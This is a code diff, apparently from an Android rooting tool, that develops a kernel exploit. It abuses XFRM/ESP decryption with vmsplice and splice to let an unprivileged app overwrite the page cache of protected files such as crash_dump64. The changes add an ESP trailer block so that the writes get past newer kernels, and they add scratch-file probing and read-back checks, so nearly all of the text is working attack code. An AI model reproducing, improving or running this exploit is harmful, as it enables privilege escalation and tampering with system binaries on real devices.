@@ -148,13 +148,24 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     *(uint32_t *)(hdr + 4) = htonl(seq);
     memcpy(hdr + 8, iv, 16);
 
-    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
-    uint8_t hmac_msg[40];
+    /* Add a private ESP trailer block after the page-cache ciphertext. Without
+     * it, the target file's last two plaintext bytes are parsed as ESP PadLen /
+     * NextHeader and many otherwise valid writes are rejected by newer kernels.
+     */
+    uint8_t trailer_plain[16] = {0};
+    trailer_plain[15] = IPPROTO_TCP;
+    uint8_t trailer_input[16], trailer_cipher[16];
+    for (int i = 0; i < 16; i++) trailer_input[i] = trailer_plain[i] ^ old_content[i];
+    aes256_ecb_encrypt(g_aes_key, trailer_input, trailer_cipher);
+
+    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(32) = 56 bytes */
+    uint8_t hmac_msg[56];
     memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
     memcpy(hmac_msg + 8,  iv,          16);  /* IV */
     memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
+    memcpy(hmac_msg + 40, trailer_cipher, 16);
     uint8_t hmac_full[32];
-    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);
+    hmac_sha256(g_hmac_key, 32, hmac_msg, 56, hmac_full);
 
     /* vmsplice header + IV (24 bytes) */
     struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
@@ -186,6 +197,13 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
         }
     }
 
+    /* This second, private CBC block makes the ESP PadLen/NextHeader trailer
+     * valid while leaving the first, file-backed ciphertext block unchanged. */
+    if (TEMP_FAILURE_RETRY(write(pfd[1], trailer_cipher, sizeof(trailer_cipher))) !=
+        (ssize_t)sizeof(trailer_cipher)) {
+        REPORTLN("write ESP trailer block failed: %s", strerror(errno)); goto out_pipe;
+    }
+
     /* vmsplice ICV (truncated HMAC) */
     struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
     if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
@@ -194,7 +212,7 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
 
     /* splice pipe → UDP: 24 + 16 + icv_len bytes */
     {
-        int total = 24 + 16 + g_icv_len;
+        int total = 24 + 32 + g_icv_len;
         ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
         ret = (s == total) ? 0 : -1;
         if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
@@ -208,37 +226,45 @@ out_pipe:
 /* Read back the destination through the ordinary file descriptor. A successful
  * send of all ESP frames is not proof that the page-cache page changed. */
 static int verify_page_cache_contents(int fd, const char *expected, size_t len,
-                                      size_t file_offset, struct Reporter *reporter) {
-    uint8_t actual[512];
-    size_t checked = 0;
+                                      size_t file_offset, const char *path,
+                                      struct Reporter *reporter) {
+    size_t matched_blocks = 0;
+    size_t mismatch_blocks = 0;
+    size_t reported_mismatches = 0;
+    size_t blocks = len / 16;
 
-    while (checked < len) {
-        size_t amount = len - checked;
-        if (amount > sizeof(actual)) amount = sizeof(actual);
+    for (size_t block = 0; block < blocks; block++) {
+        uint8_t actual[16];
+        size_t checked = block * sizeof(actual);
         off_t offset = (off_t)(file_offset + checked);
-        ssize_t n = TEMP_FAILURE_RETRY(pread(fd, actual, amount, offset));
-        if (n != (ssize_t)amount) {
-            REPORTLN("pagecache read-back failed at 0x%lx: got %zd/%zu (%s)",
-                     (long)offset, n, amount, n < 0 ? strerror(errno) : "short read");
+        ssize_t n = TEMP_FAILURE_RETRY(pread(fd, actual, sizeof(actual), offset));
+        if (n != (ssize_t)sizeof(actual)) {
+            REPORTLN("pagecache read-back failed at 0x%lx: got %zd/16 (%s)",
+                     (long)offset, n, n < 0 ? strerror(errno) : "short read");
             return -1;
         }
-        if (memcmp(actual, expected + checked, amount) != 0) {
+        if (memcmp(actual, expected + checked, sizeof(actual)) == 0) {
+            matched_blocks++;
+            continue;
+        }
+
+        mismatch_blocks++;
+        if (reported_mismatches < 4) {
             size_t mismatch = 0;
-            while (mismatch < amount &&
+            while (mismatch < sizeof(actual) &&
                    actual[mismatch] == (uint8_t)expected[checked + mismatch])
                 mismatch++;
-            REPORTLN("pagecache read-back mismatch at 0x%lx: expected %02x got %02x",
+            REPORTLN("pagecache mismatch at 0x%lx: expected %02x got %02x",
                      (long)(offset + (off_t)mismatch),
                      (unsigned int)(uint8_t)expected[checked + mismatch],
                      (unsigned int)actual[mismatch]);
-            return -1;
+            reported_mismatches++;
         }
-        checked += amount;
     }
 
-    REPORTLN("pagecache read-back verified: %zu bytes at %s+0x%zx",
-             len, kCrashDump, file_offset);
-    return 0;
+    REPORTLN("pagecache read-back: %zu/%zu blocks match at %s+0x%zx",
+             matched_blocks, blocks, path, file_offset);
+    return mismatch_blocks == 0 ? 0 : -1;
 }
 
 /* Patch len bytes of payload into file starting at file offset foff.
@@ -316,8 +342,8 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             REPORTLN("%zu ...", i * 16);
     }
 
-    if (rc == 0 && !use_helper && strcmp(path, kCrashDump) == 0 &&
-        verify_page_cache_contents(file_fd, payload, len, foff, reporter) != 0)
+    if (rc == 0 && !use_helper &&
+        verify_page_cache_contents(file_fd, payload, len, foff, path, reporter) != 0)
         rc = -2;
 
     if (!use_helper) close(file_fd);
@@ -555,6 +581,66 @@ static void fadvise_drop(const char *path, struct Reporter *reporter) {
     REPORTLN("* cache dropped: %s", path);
 }
 
+/* Tests the XFRM page-cache write using only a disposable file owned by the
+ * app. The caller removes the file after this function drops its cached page.
+ */
+JNIEXPORT jint JNICALL
+Java_df_root_DFBridge_nativeProbeScratchFile(JNIEnv *env,
+                                             jclass clz __attribute__((unused)),
+                                             jobject reporter_obj,
+                                             jint encapPort, jint spi,
+                                             jbyteArray aesCbcKey,
+                                             jbyteArray hmacKey, jint icvLen,
+                                             jint senderPort,
+                                             jstring probePath,
+                                             jbyteArray replacement) {
+    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
+    if (!aesCbcKey || !hmacKey || !probePath || !replacement ||
+        (*env)->GetArrayLength(env, aesCbcKey) < 32 ||
+        (*env)->GetArrayLength(env, hmacKey) < 32) {
+        REPORTLN("[diag] invalid scratch probe arguments");
+        return -1;
+    }
+
+    jsize len = (*env)->GetArrayLength(env, replacement);
+    if (len <= 0 || (len % 16) != 0) {
+        REPORTLN("[diag] scratch payload length must be a positive multiple of 16");
+        return -1;
+    }
+
+    g_encap_port = (int)encapPort;
+    g_sender_port = (int)senderPort;
+    g_spi = (uint32_t)spi;
+    g_seq = 1;
+    g_icv_len = (int)icvLen;
+
+    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
+    if (!kb) { REPORTLN("[diag] AES key unavailable"); return -1; }
+    memcpy(g_aes_key, kb, sizeof(g_aes_key));
+    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
+
+    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
+    if (!hb) { REPORTLN("[diag] HMAC key unavailable"); return -1; }
+    memcpy(g_hmac_key, hb, sizeof(g_hmac_key));
+    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
+
+    const char *path = (*env)->GetStringUTFChars(env, probePath, NULL);
+    if (!path) { REPORTLN("[diag] scratch path unavailable"); return -1; }
+    jbyte *payload = (*env)->GetByteArrayElements(env, replacement, NULL);
+    if (!payload) {
+        (*env)->ReleaseStringUTFChars(env, probePath, path);
+        REPORTLN("[diag] scratch payload unavailable");
+        return -1;
+    }
+
+    REPORTLN("[diag] testing XFRM page-cache write against app-owned scratch file");
+    int rc = patch_file_cbc(path, (const char *)payload, (size_t)len, 0, 0, reporter);
+    fadvise_drop(path, reporter);
+    (*env)->ReleaseByteArrayElements(env, replacement, payload, JNI_ABORT);
+    (*env)->ReleaseStringUTFChars(env, probePath, path);
+    return rc;
+}
+
 /* A059-only preflight. It changes only crash_dump64's page cache, verifies the
  * result with pread, then drops that cache. It stops before the vendor KO write
  * and does not load a module or invoke the root-install chain.
@@ -577,7 +663,6 @@ Java_df_root_DFBridge_nativeProbeCrashDump(JNIEnv *env,
     g_encap_port = (int)encapPort;
     g_sender_port = (int)senderPort;
     g_spi = (uint32_t)spi;
-    g_seq = 1;
     g_icv_len = (int)icvLen;
 
     jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
@@ -599,6 +684,16 @@ Java_df_root_DFBridge_nativeProbeCrashDump(JNIEnv *env,
     REPORTLN("[diag] A059 crash_dump64 page-cache preflight (unprivileged app)");
     int rc = patch_file_cbc(kCrashDump, helper, helper_len, 0, 0, reporter);
     free(helper);
+    if (rc == 0) {
+        uint8_t sample[16];
+        REPORTLN("[diag] invoking the patched crash_dump64 read bridge");
+        if (read_vendor_content(0, sample, reporter) != 0) {
+            REPORTLN("[diag] patched crash_dump64 did not return vendor bytes");
+            rc = -3;
+        } else {
+            REPORTLN("[diag] patched crash_dump64 returned 16 vendor bytes");
+        }
+    }
     fadvise_drop(kCrashDump, reporter);
 
     if (rc == 0) {
